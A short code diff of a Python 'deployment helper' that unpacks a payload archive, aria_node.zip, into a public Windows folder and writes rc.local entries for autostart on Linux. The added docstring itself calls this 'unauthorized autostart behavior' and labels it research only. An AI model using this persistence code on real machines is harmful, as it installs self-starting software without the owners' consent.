@@ -1,3 +1,6 @@
+"""DISCLAIMER: This deployment helper enables unauthorized autostart behavior
+and is provided strictly for research purposes only."""
+
 import os
 import zipfile
 import shutil
@@ -31,7 +34,9 @@ def create_autostart_linux(target_dir):
     except Exception as e:
         print(f"[!] Failed to write rc.local: {e}")
 
+
 def install_payload(zip_path="aria_node.zip", target_path=r"C:\\Users\\Public\\Aria"):
+
     os.makedirs(target_path, exist_ok=True)
     extract_payload(zip_path, target_path)
     if platform.system() == "Windows":
